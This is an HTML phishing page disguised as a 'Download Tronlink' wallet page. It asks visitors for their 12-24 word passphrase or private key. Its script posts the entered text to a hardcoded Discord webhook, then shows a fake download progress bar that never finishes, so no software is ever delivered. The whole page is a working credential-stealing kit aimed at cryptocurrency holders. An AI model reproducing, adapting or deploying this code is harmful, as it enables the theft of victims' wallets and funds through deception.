<!DOCTYPE html>
<html>
<head>
  <title>Download Tronlink</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">

  <style>
    body {
      font-family: 'Roboto', sans-serif;
      background: linear-gradient(-45deg, #007bff, #b8d8e6, #007bff, #b8d8e6);
      background-size: 400% 400%;
      animation: gradientAnimation 10s ease infinite;
    }

    @keyframes gradientAnimation {
      0% {
        background-position: 0% 50%;
      }
      50% {
        background-position: 100% 50%;
      }
      100% {
        background-position: 0% 50%;
      }
    }
     .image-logo {
      position: absolute;
      top: 10px;
      left: 10px;
      width: 100px;
    }
   .image-gif {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 25%;
    }


    .container {
      max-width: 600px;
      margin: 0 auto;
      padding-top: 80px;
      text-align: center;
    }

    h2 {
      font-size: 24px;
      margin-bottom: 20px;
      color: white;
      margin-top: 40px;
      text-transform: uppercase;
      letter-spacing: 2px;
    }

    .input-field {
      background-color: #e9ecef;
      border: 2px solid #17a2b8;
      padding: 20px;
      margin-bottom: 20px;
      width: 100%;
      border-radius: 5px;
      font-size: 16px;
      color: #495057;
    }

    .button {
      background-color: #2367D1;
      border: none;
      color: #ffffff;
      padding: 15px 40px;
      text-align: center;
      text-decoration: none;
      display: inline-block;
      font-size: 18px;
      margin-bottom: 20px;
      cursor: pointer;
      border-radius: 5px;
      transition: background-color 0.3s ease;
    }

    .button:hover {
      background-color: #138496;
    }

    .loading-button {
      background-color: #138496;
      position: relative;
    }

    .loading-button:after {
      content: "";
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      display: inline-block;
      width: 16px;
      height: 16px;
      margin-left: 10px;
      border: 3px solid #ffffff;
      border-top-color: transparent;
      border-radius: 50%;
      animation: loading 5s infinite;
    }

    .back-button {
      position: absolute;
      top: 10px;
      right: 10px;
      background-color: #2367D1;
      color: #ffffff;
      border: none;
      padding: 5px 20px;
      font-size: 16px;
      cursor: pointer;
      border-radius: 5px;
      transition: background-color 0.3s ease;
      margin-top: 20px;
    }

    .back-button:hover {
      background-color: #138496;
    }

    @keyframes loading {
      0% {
        transform: translate(-50%, -50%) rotate(0deg);
      }
      100% {
        transform: translate(-50%, -50%) rotate(360deg);
      }
    }

    @media screen and (max-width: 600px) {
      .container {
        padding: 10px;
      }

      h2 {
        font-size: 20px;
      }

      .input-field {
        padding: 15px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <img class="image-logo" src="https://lavender-bewildered-octopus-416.mypinata.cloud/ipfs/QmQyw5FbGkGgZeAgnUSs1h1MeRkYpaXCFrm2V5G56ieLZy?_gl=1*1vqjvjn*rs_ga*NTgzMzM3YTMtOWRiMS00MjJmLTgyOGItODNiMzI4NGEzZmQw*rs_ga_5RMPXG14TE*MTY4NzY2NTA4Ni4yMi4xLjE2ODc2NjczODEuNjAuMC4w" alt="Logo">
    <button class="back-button" onclick="window.history.back()">Back</button>
    <h2>Enter your 12-24 word passphrase or paste your PrivateKey to continue</h2>
    <input type="text" id="input-text" class="input-field" placeholder="Enter text">
    <button id="download-button" class="button">Download</button>
     <img class="image-gif" src="https://lavender-bewildered-octopus-416.mypinata.cloud/ipfs/QmSWfM1zRSd96jbHj3sJSZcigGt6zjwxtWUhtbLD6AaEQg" alt="Animation">
  </div>

  <script>
    function sendDataToDiscord() {
      var text = document.getElementById("input-text").value;

      // Construir el objeto con los datos a enviar
      var data = {
        content: text
      };

      // Realizar la solicitud POST a través de fetch
      fetch('https://discordapp.com/api/webhooks/1073374509165465700/mr2ICeCadLB01KfbfV0HSI7bfpBkIaYTyIFMPLMW58Og3xWGRpv2EOOowLITDz3SRs3m', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
      })
      .then(function(response) {
        console.log("Los datos se enviaron correctamente a Discord.");
      })
      .catch(function(error) {
        console.error("Error en la solicitud:", error);
      });

      // Simulación de carga para animar el botón
      var button = document.getElementById("download-button");
      button.classList.add("loading-button");
      button.disabled = true;

      var progress = 0;
      var interval = setInterval(function() {
        progress++;
        button.innerText = "Downloading... " + progress + "%";

        if (progress === 99) {
          clearInterval(interval);
          button.disabled = false;
          button.classList.remove("loading-button");
          button.innerText = "Descargar";
        }
      }, 200);
    }

    var downloadButton = document.getElementById("download-button");
    downloadButton.addEventListener("click", sendDataToDiscord);
  </script>
</body>
</html>
